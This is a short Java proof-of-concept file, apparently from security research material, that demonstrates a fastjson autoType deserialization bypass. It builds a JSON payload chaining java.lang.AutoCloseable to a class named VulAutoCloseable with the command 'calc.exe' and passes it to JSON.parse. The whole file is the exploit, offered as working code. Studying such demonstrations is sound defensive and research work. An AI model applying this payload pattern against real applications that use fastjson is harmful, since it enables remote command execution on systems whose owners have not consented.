import com.alibaba.fastjson.JSON;

public class FastjsonBypass1 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"VulAutoCloseable\",\"cmd\":\"calc.exe\"}";
        JSON.parse(poc);
    }
}
